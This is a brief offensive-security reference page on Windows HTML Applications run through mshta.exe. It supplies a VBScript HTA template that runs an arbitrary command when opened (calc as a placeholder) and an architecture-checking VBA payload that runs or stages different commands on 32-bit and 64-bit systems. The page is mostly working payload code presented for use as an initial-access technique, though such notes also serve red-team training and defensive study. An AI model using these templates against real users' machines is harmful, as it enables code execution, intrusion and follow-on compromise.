# HTML Application (HTA)

- An HTML application (HTA) is a Windows proprietary program whose source code consists of HTML and one or more scripting languages supported by Internet Explorer: VBScript and JScript.
- Executes **without the constraint of the browser's security model**.
- Executed using `mshta.exe`, which is dependent on Internet Explorer.

---

## `calc.exe` HTA

```html
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

You can replace `calc` with any command.

---

## Architecture-Dependent Execution VBA Payload

Sometimes the default `mshta.exe` binary is the 32-bit version (`C:\Windows\SysWOW64\mshta.exe`), not the 64-bit version (`C:\Windows\System32\mshta.exe`).

Given this, you may want to include an architecture check in your payload and execute a different command (or stage a different payload) accordingly.

```vba
Function Pwn()
  Set shell = CreateObject("wscript.Shell")

  If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
    shell.run "$COMMAND_IF_64_BIT"
  Else
    shell.run "$COMMAND_IF_32_BIT"
  End If

End Function
Pwn
```
